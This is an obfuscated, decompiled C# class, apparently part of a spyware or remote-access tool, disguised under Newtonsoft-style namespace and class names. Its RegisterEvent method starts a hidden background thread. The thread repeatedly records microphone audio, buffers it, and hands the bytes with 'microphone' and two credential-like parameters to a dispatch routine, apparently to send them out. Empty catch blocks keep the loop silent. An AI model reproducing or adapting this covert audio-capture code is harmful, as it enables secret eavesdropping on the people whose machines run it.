using GDBD.Filter;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Newtonsoft.Expressions;
using Newtonsoft.Rules;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Newtonsoft.Annotations
{
	internal sealed class PrinterListAnnotation
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public string _0005;

			public string _0006;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				while (!m_Val)
				{
					try
					{
						using (PageList pageList = new PageList())
						{
							Stream stream = new MemoryStream();
							pageList._0003(this._0001);
							pageList._0001(RestartEvent);
							pageList._0001(new RefList(_0002, _0003));
							invocation = new DicInstanceRule(new ItemClassSpec(stream), pageList._0001());
							pageList._0001();
							Thread.Sleep(_0004);
							pageList._0002();
							long position = 0L;
							if (stream.CanSeek)
							{
								position = stream.Position;
								stream.Position = 0L;
							}
							byte[] array3;
							try
							{
								byte[] array = new byte[5096];
								int num = 0;
								int num2;
								while ((num2 = stream.Read(array, num, array.Length - num)) > 0)
								{
									num += num2;
									if (num == array.Length)
									{
										int num3 = stream.ReadByte();
										if (num3 != -1)
										{
											byte[] array2 = new byte[array.Length * 2];
											Buffer.BlockCopy(array, 0, array2, 0, array.Length);
											Buffer.SetByte(array2, num, (byte)num3);
											array = array2;
											num++;
										}
									}
								}
								array3 = array;
								if (array.Length != num)
								{
									array3 = new byte[num];
									Buffer.BlockCopy(array, 0, array3, 0, num);
								}
							}
							finally
							{
								if (stream.CanSeek)
								{
									stream.Position = position;
								}
							}
							DispatcherInstanceExpression.CustomizeFilter(array3, "microphone", _0005, _0006);
							DispatcherInstanceExpression.ExcludeFilter("MicrophoneStatus", "1", _0005, _0006);
						}
						GC.Collect();
					}
					catch
					{
					}
					Thread.Sleep(100);
				}
				m_Val = false;
			}
		}

		private static Thread m_Pool;

		private static bool m_Val;

		private static DicInstanceRule invocation;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void RegisterEvent(int indexOf_i, int visitor_end, int indexstate, int setup2_offset, string instance3, string first4)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (m_Pool == null)
			{
				m_Pool = new Thread((ThreadStart)delegate
				{
					//Discarded unreachable code: IL_0002
					//IL_0003: Incompatible stack heights: 0 vs 1
					while (!m_Val)
					{
						try
						{
							using (PageList pageList = new PageList())
							{
								Stream stream = new MemoryStream();
								pageList._0003(indexOf_i);
								pageList._0001(RestartEvent);
								pageList._0001(new RefList(visitor_end, indexstate));
								invocation = new DicInstanceRule(new ItemClassSpec(stream), pageList._0001());
								pageList._0001();
								Thread.Sleep(setup2_offset);
								pageList._0002();
								long position = 0L;
								if (stream.CanSeek)
								{
									position = stream.Position;
									stream.Position = 0L;
								}
								byte[] array3;
								try
								{
									byte[] array = new byte[5096];
									int num = 0;
									int num2;
									while ((num2 = stream.Read(array, num, array.Length - num)) > 0)
									{
										num += num2;
										if (num == array.Length)
										{
											int num3 = stream.ReadByte();
											if (num3 != -1)
											{
												byte[] array2 = new byte[array.Length * 2];
												Buffer.BlockCopy(array, 0, array2, 0, array.Length);
												Buffer.SetByte(array2, num, (byte)num3);
												array = array2;
												num++;
											}
										}
									}
									array3 = array;
									if (array.Length != num)
									{
										array3 = new byte[num];
										Buffer.BlockCopy(array, 0, array3, 0, num);
									}
								}
								finally
								{
									if (stream.CanSeek)
									{
										stream.Position = position;
									}
								}
								DispatcherInstanceExpression.CustomizeFilter(array3, "microphone", instance3, first4);
								DispatcherInstanceExpression.ExcludeFilter("MicrophoneStatus", "1", instance3, first4);
							}
							GC.Collect();
						}
						catch
						{
						}
						Thread.Sleep(100);
					}
					m_Val = false;
				});
				m_Pool.Start();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static void RestartEvent(object info, TemplateList connection)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			invocation.Write(connection._0001(), 0, connection._0001());
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void SearchEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (m_Pool != null)
			{
				m_Val = true;
				while (m_Val)
				{
					Thread.Sleep(500);
				}
				invocation.Dispose();
				invocation = null;
				m_Pool = null;
				GC.Collect();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public PrinterListAnnotation()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static PrinterListAnnotation()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			m_Pool = null;
			m_Val = false;
			invocation = null;
		}
	}
}
